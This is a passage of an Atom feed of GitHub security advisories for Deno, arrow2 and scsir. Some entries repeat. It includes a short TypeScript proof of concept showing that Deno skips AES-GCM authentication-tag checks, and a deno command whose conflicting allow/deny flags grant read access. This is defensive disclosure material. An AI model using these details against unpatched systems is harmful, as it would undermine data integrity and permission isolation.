<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48934">https://nvd.nist.gov/vuln/detail/CVE-2025-48934</a></li>
<li><a href="https://github.com/advisories/GHSA-7w8p-chxq-2789">https://github.com/advisories/GHSA-7w8p-chxq-2789</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7w8p-chxq-2789</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-04T21:18:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno_runtime] Deno run with --allow-read and --deny-read flags results in allowed]]></title>
        <id>https://github.com/advisories/GHSA-xqxc-x6p3-w683</id>
        <link href="https://github.com/advisories/GHSA-xqxc-x6p3-w683"/>
        <updated>2025-06-04T22:56:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>deno run --allow-read --deny-read main.ts</code> results in allowed, even though 'deny' should be stronger. Same with all global unary permissions given as <code>--allow-* --deny-*</code>.</p>
<h3 id="details">Details</h3>
<p>Caused by the fast exit logic in #22894.</p>
<h3 id="poc">PoC</h3>
<p>Run the above command expecting no permissions to be passed.</p>
<h3 id="impact">Impact</h3>
<p>This only affects a nonsensical combination of flags, so there shouldn't be a real impact on the userbase.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-xqxc-x6p3-w683">https://github.com/denoland/deno/security/advisories/GHSA-xqxc-x6p3-w683</a></li>
<li><a href="https://github.com/denoland/deno/pull/22894">https://github.com/denoland/deno/pull/22894</a></li>
<li><a href="https://github.com/denoland/deno/pull/29213">https://github.com/denoland/deno/pull/29213</a></li>
<li><a href="https://github.com/denoland/deno/commit/2f0fae9d9071dcaf0a689bc7097584b1b9ebc8db">https://github.com/denoland/deno/commit/2f0fae9d9071dcaf0a689bc7097584b1b9ebc8db</a></li>
<li><a href="https://github.com/denoland/deno/commit/9d665572d3cd39f997e29e6daac7c1102fc5c04f">https://github.com/denoland/deno/commit/9d665572d3cd39f997e29e6daac7c1102fc5c04f</a></li>
<li><a href="https://github.com/denoland/deno/commit/ef315b56c26c9ef5f25284a5100d2ed525a148cf">https://github.com/denoland/deno/commit/ef315b56c26c9ef5f25284a5100d2ed525a148cf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48888">https://nvd.nist.gov/vuln/detail/CVE-2025-48888</a></li>
<li><a href="https://github.com/advisories/GHSA-xqxc-x6p3-w683">https://github.com/advisories/GHSA-xqxc-x6p3-w683</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xqxc-x6p3-w683</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-04T21:13:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno run with --allow-read and --deny-read flags results in allowed]]></title>
        <id>https://github.com/advisories/GHSA-xqxc-x6p3-w683</id>
        <link href="https://github.com/advisories/GHSA-xqxc-x6p3-w683"/>
        <updated>2025-06-04T22:56:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>deno run --allow-read --deny-read main.ts</code> results in allowed, even though 'deny' should be stronger. Same with all global unary permissions given as <code>--allow-* --deny-*</code>.</p>
<h3 id="details">Details</h3>
<p>Caused by the fast exit logic in #22894.</p>
<h3 id="poc">PoC</h3>
<p>Run the above command expecting no permissions to be passed.</p>
<h3 id="impact">Impact</h3>
<p>This only affects a nonsensical combination of flags, so there shouldn't be a real impact on the userbase.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-xqxc-x6p3-w683">https://github.com/denoland/deno/security/advisories/GHSA-xqxc-x6p3-w683</a></li>
<li><a href="https://github.com/denoland/deno/pull/22894">https://github.com/denoland/deno/pull/22894</a></li>
<li><a href="https://github.com/denoland/deno/pull/29213">https://github.com/denoland/deno/pull/29213</a></li>
<li><a href="https://github.com/denoland/deno/commit/2f0fae9d9071dcaf0a689bc7097584b1b9ebc8db">https://github.com/denoland/deno/commit/2f0fae9d9071dcaf0a689bc7097584b1b9ebc8db</a></li>
<li><a href="https://github.com/denoland/deno/commit/9d665572d3cd39f997e29e6daac7c1102fc5c04f">https://github.com/denoland/deno/commit/9d665572d3cd39f997e29e6daac7c1102fc5c04f</a></li>
<li><a href="https://github.com/denoland/deno/commit/ef315b56c26c9ef5f25284a5100d2ed525a148cf">https://github.com/denoland/deno/commit/ef315b56c26c9ef5f25284a5100d2ed525a148cf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48888">https://nvd.nist.gov/vuln/detail/CVE-2025-48888</a></li>
<li><a href="https://github.com/advisories/GHSA-xqxc-x6p3-w683">https://github.com/advisories/GHSA-xqxc-x6p3-w683</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xqxc-x6p3-w683</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-04T21:13:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno run with --allow-read and --deny-read flags results in allowed]]></title>
        <id>https://github.com/advisories/GHSA-xqxc-x6p3-w683</id>
        <link href="https://github.com/advisories/GHSA-xqxc-x6p3-w683"/>
        <updated>2025-06-04T22:56:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>deno run --allow-read --deny-read main.ts</code> results in allowed, even though 'deny' should be stronger. Same with all global unary permissions given as <code>--allow-* --deny-*</code>.</p>
<h3 id="details">Details</h3>
<p>Caused by the fast exit logic in #22894.</p>
<h3 id="poc">PoC</h3>
<p>Run the above command expecting no permissions to be passed.</p>
<h3 id="impact">Impact</h3>
<p>This only affects a nonsensical combination of flags, so there shouldn't be a real impact on the userbase.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-xqxc-x6p3-w683">https://github.com/denoland/deno/security/advisories/GHSA-xqxc-x6p3-w683</a></li>
<li><a href="https://github.com/denoland/deno/pull/22894">https://github.com/denoland/deno/pull/22894</a></li>
<li><a href="https://github.com/denoland/deno/pull/29213">https://github.com/denoland/deno/pull/29213</a></li>
<li><a href="https://github.com/denoland/deno/commit/2f0fae9d9071dcaf0a689bc7097584b1b9ebc8db">https://github.com/denoland/deno/commit/2f0fae9d9071dcaf0a689bc7097584b1b9ebc8db</a></li>
<li><a href="https://github.com/denoland/deno/commit/9d665572d3cd39f997e29e6daac7c1102fc5c04f">https://github.com/denoland/deno/commit/9d665572d3cd39f997e29e6daac7c1102fc5c04f</a></li>
<li><a href="https://github.com/denoland/deno/commit/ef315b56c26c9ef5f25284a5100d2ed525a148cf">https://github.com/denoland/deno/commit/ef315b56c26c9ef5f25284a5100d2ed525a148cf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48888">https://nvd.nist.gov/vuln/detail/CVE-2025-48888</a></li>
<li><a href="https://github.com/advisories/GHSA-xqxc-x6p3-w683">https://github.com/advisories/GHSA-xqxc-x6p3-w683</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xqxc-x6p3-w683</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-04T21:13:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno run with --allow-read and --deny-read flags results in allowed]]></title>
        <id>https://github.com/advisories/GHSA-xqxc-x6p3-w683</id>
        <link href="https://github.com/advisories/GHSA-xqxc-x6p3-w683"/>
        <updated>2025-06-04T22:56:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>deno run --allow-read --deny-read main.ts</code> results in allowed, even though 'deny' should be stronger. Same with all global unary permissions given as <code>--allow-* --deny-*</code>.</p>
<h3 id="details">Details</h3>
<p>Caused by the fast exit logic in #22894.</p>
<h3 id="poc">PoC</h3>
<p>Run the above command expecting no permissions to be passed.</p>
<h3 id="impact">Impact</h3>
<p>This only affects a nonsensical combination of flags, so there shouldn't be a real impact on the userbase.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-xqxc-x6p3-w683">https://github.com/denoland/deno/security/advisories/GHSA-xqxc-x6p3-w683</a></li>
<li><a href="https://github.com/denoland/deno/pull/22894">https://github.com/denoland/deno/pull/22894</a></li>
<li><a href="https://github.com/denoland/deno/pull/29213">https://github.com/denoland/deno/pull/29213</a></li>
<li><a href="https://github.com/denoland/deno/commit/2f0fae9d9071dcaf0a689bc7097584b1b9ebc8db">https://github.com/denoland/deno/commit/2f0fae9d9071dcaf0a689bc7097584b1b9ebc8db</a></li>
<li><a href="https://github.com/denoland/deno/commit/9d665572d3cd39f997e29e6daac7c1102fc5c04f">https://github.com/denoland/deno/commit/9d665572d3cd39f997e29e6daac7c1102fc5c04f</a></li>
<li><a href="https://github.com/denoland/deno/commit/ef315b56c26c9ef5f25284a5100d2ed525a148cf">https://github.com/denoland/deno/commit/ef315b56c26c9ef5f25284a5100d2ed525a148cf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48888">https://nvd.nist.gov/vuln/detail/CVE-2025-48888</a></li>
<li><a href="https://github.com/advisories/GHSA-xqxc-x6p3-w683">https://github.com/advisories/GHSA-xqxc-x6p3-w683</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xqxc-x6p3-w683</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-04T21:13:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno_node] Deno's AES GCM authentication tags are not verified]]></title>
        <id>https://github.com/advisories/GHSA-2x3r-hwv5-p32x</id>
        <link href="https://github.com/advisories/GHSA-2x3r-hwv5-p32x"/>
        <updated>2025-06-04T22:56:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>This affects AES-256-GCM and AES-128-GCM in Deno, introduced by commit <a href="https://github.com/denoland/deno/commit/0d1beed">0d1beed</a>. Specifically, the authentication tag is not being validated. This means tampered ciphertexts or incorrect keys might not be detected, which breaks the guarantees expected from AES-GCM. Older versions of Deno correctly threw errors in such cases, as does Node.js.</p>
<p>Without authentication tag verification, AES-GCM degrades to essentially CTR mode, removing integrity protection. Authenticated data set with set_aad is also affected, as it is incorporated into the GCM hash (ghash) but this too is not validated, rendering AAD checks ineffective.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-ts">import { Buffer } from "node:buffer";
import {
  createCipheriv,
  createDecipheriv,
  randomBytes,
  scrypt,
} from "node:crypto";

type Encrypted = {
  salt: string;
  iv: string;
  enc: string;
  authTag: string;
};

const deriveKey = (key: string, salt: Buffer) =&gt;
  new Promise&lt;Buffer&gt;((res, rej) =&gt;
    scrypt(key, salt, 32, (err, k) =&gt; {
      if (err) rej(err);
      else res(k);
    })
  );

async function encrypt(text: string, key: string): Promise&lt;Encrypted&gt; {
  const salt = randomBytes(32);
  const k = await deriveKey(key, salt);

  const iv = randomBytes(16);
  const enc = createCipheriv("aes-256-gcm", k, iv);
  const ciphertext = enc.update(text, "binary", "binary") + enc.final("binary");

  return {
    salt: salt.toString("binary"),
    iv: iv.toString("binary"),
    enc: ciphertext,
    authTag: enc.getAuthTag().toString("binary"),
  };
}

async function decrypt(enc: Encrypted, key: string) {
  const k = await deriveKey(key, Buffer.from(enc.salt, "binary"));
  const dec = createDecipheriv("aes-256-gcm", k, Buffer.from(enc.iv, "binary"));

  const out = dec.update(enc.enc, "binary", "binary");
  dec.setAuthTag(Buffer.from(enc.authTag, "binary"));
  return out + dec.final("binary");
}

const test = await encrypt("abcdefghi", "key");
test.enc = "";
console.log(await decrypt(test, "")); // no error
</code></pre>
<h3 id="impact">Impact</h3>
<p>While discovered through experimentation, authentication failures that should raise errors may be silently ignored.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-2x3r-hwv5-p32x">https://github.com/denoland/deno/security/advisories/GHSA-2x3r-hwv5-p32x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24015">https://nvd.nist.gov/vuln/detail/CVE-2025-24015</a></li>
<li><a href="https://github.com/denoland/deno/commit/0d1beed2e3633d71d5e288e0382b85be361ec13d">https://github.com/denoland/deno/commit/0d1beed2e3633d71d5e288e0382b85be361ec13d</a></li>
<li><a href="https://github.com/denoland/deno/commit/4f27d7cdc02e3edfb9d36275341fb8185d6e99ed">https://github.com/denoland/deno/commit/4f27d7cdc02e3edfb9d36275341fb8185d6e99ed</a></li>
<li><a href="https://github.com/denoland/deno/commit/a4003a5292bd0affefad3ecb24a8732886900f67">https://github.com/denoland/deno/commit/a4003a5292bd0affefad3ecb24a8732886900f67</a></li>
<li><a href="https://github.com/denoland/deno/commit/0d1beed">https://github.com/denoland/deno/commit/0d1beed</a></li>
<li><a href="https://github.com/advisories/GHSA-2x3r-hwv5-p32x">https://github.com/advisories/GHSA-2x3r-hwv5-p32x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2x3r-hwv5-p32x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-04T20:48:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno's AES GCM authentication tags are not verified]]></title>
        <id>https://github.com/advisories/GHSA-2x3r-hwv5-p32x</id>
        <link href="https://github.com/advisories/GHSA-2x3r-hwv5-p32x"/>
        <updated>2025-06-04T22:56:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>This affects AES-256-GCM and AES-128-GCM in Deno, introduced by commit <a href="https://github.com/denoland/deno/commit/0d1beed">0d1beed</a>. Specifically, the authentication tag is not being validated. This means tampered ciphertexts or incorrect keys might not be detected, which breaks the guarantees expected from AES-GCM. Older versions of Deno correctly threw errors in such cases, as does Node.js.</p>
<p>Without authentication tag verification, AES-GCM degrades to essentially CTR mode, removing integrity protection. Authenticated data set with set_aad is also affected, as it is incorporated into the GCM hash (ghash) but this too is not validated, rendering AAD checks ineffective.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-ts">import { Buffer } from "node:buffer";
import {
  createCipheriv,
  createDecipheriv,
  randomBytes,
  scrypt,
} from "node:crypto";

type Encrypted = {
  salt: string;
  iv: string;
  enc: string;
  authTag: string;
};

const deriveKey = (key: string, salt: Buffer) =&gt;
  new Promise&lt;Buffer&gt;((res, rej) =&gt;
    scrypt(key, salt, 32, (err, k) =&gt; {
      if (err) rej(err);
      else res(k);
    })
  );

async function encrypt(text: string, key: string): Promise&lt;Encrypted&gt; {
  const salt = randomBytes(32);
  const k = await deriveKey(key, salt);

  const iv = randomBytes(16);
  const enc = createCipheriv("aes-256-gcm", k, iv);
  const ciphertext = enc.update(text, "binary", "binary") + enc.final("binary");

  return {
    salt: salt.toString("binary"),
    iv: iv.toString("binary"),
    enc: ciphertext,
    authTag: enc.getAuthTag().toString("binary"),
  };
}

async function decrypt(enc: Encrypted, key: string) {
  const k = await deriveKey(key, Buffer.from(enc.salt, "binary"));
  const dec = createDecipheriv("aes-256-gcm", k, Buffer.from(enc.iv, "binary"));

  const out = dec.update(enc.enc, "binary", "binary");
  dec.setAuthTag(Buffer.from(enc.authTag, "binary"));
  return out + dec.final("binary");
}

const test = await encrypt("abcdefghi", "key");
test.enc = "";
console.log(await decrypt(test, "")); // no error
</code></pre>
<h3 id="impact">Impact</h3>
<p>While discovered through experimentation, authentication failures that should raise errors may be silently ignored.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-2x3r-hwv5-p32x">https://github.com/denoland/deno/security/advisories/GHSA-2x3r-hwv5-p32x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24015">https://nvd.nist.gov/vuln/detail/CVE-2025-24015</a></li>
<li><a href="https://github.com/denoland/deno/commit/0d1beed2e3633d71d5e288e0382b85be361ec13d">https://github.com/denoland/deno/commit/0d1beed2e3633d71d5e288e0382b85be361ec13d</a></li>
<li><a href="https://github.com/denoland/deno/commit/4f27d7cdc02e3edfb9d36275341fb8185d6e99ed">https://github.com/denoland/deno/commit/4f27d7cdc02e3edfb9d36275341fb8185d6e99ed</a></li>
<li><a href="https://github.com/denoland/deno/commit/a4003a5292bd0affefad3ecb24a8732886900f67">https://github.com/denoland/deno/commit/a4003a5292bd0affefad3ecb24a8732886900f67</a></li>
<li><a href="https://github.com/denoland/deno/commit/0d1beed">https://github.com/denoland/deno/commit/0d1beed</a></li>
<li><a href="https://github.com/advisories/GHSA-2x3r-hwv5-p32x">https://github.com/advisories/GHSA-2x3r-hwv5-p32x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2x3r-hwv5-p32x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-04T20:48:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[arrow2] Arrow2 allows out of bounds access in public safe API]]></title>
        <id>https://github.com/advisories/GHSA-wv8j-m3hx-924j</id>
        <link href="https://github.com/advisories/GHSA-wv8j-m3hx-924j"/>
        <updated>2025-05-30T20:09:57.000Z</updated>
        <content type="html"><![CDATA[<p><code>Rows::row_unchecked()</code> allows out of bounds access to the underlying buffer without sufficient checks.</p>
<p>The arrow2 crate is no longer maintained, so there are no plans to fix this issue. Users are advised to migrate to the arrow crate, instead.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2025-0038.html">https://rustsec.org/advisories/RUSTSEC-2025-0038.html</a></li>
<li><a href="https://github.com/advisories/GHSA-wv8j-m3hx-924j">https://github.com/advisories/GHSA-wv8j-m3hx-924j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wv8j-m3hx-924j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-05-30T20:09:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scsir] SCSIR has a Potential Unsound Issue in WriteSameCommand]]></title>
        <id>https://github.com/advisories/GHSA-cm3g-qm4h-xm6m</id>
        <link href="https://github.com/advisories/GHSA-cm3g-qm4h-xm6m"/>
        <updated>2025-05-27T18:52:09.000Z</updated>
        <content type="html"><![CDATA[<p>In group_number in the scsir crate 0.2.0 for Rust, there can be an overflow because a hardware device may expect a small number of bits (e.g., 5 bits) for group number.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48756">https://nvd.nist.gov/vuln/detail/CVE-2025-48756</a></li>
<li><a href="https://github.com/maboroshinokiseki/scsir/issues/4">https://github.com/maboroshinokiseki/scsir/issues/4</a></li>
<li><a href="https://crates.io/crates/scsir">https://crates.io/crates/scsir</a></li>
<li><a href="https://github.com/advisories/GHSA-cm3g-qm4h-xm6m">https://github.com/advisories/GHSA-cm3g-qm4h-xm6m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cm3g-qm4h-xm6m</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-05-24T03:30:19.000Z</published>
    </entry>
</feed>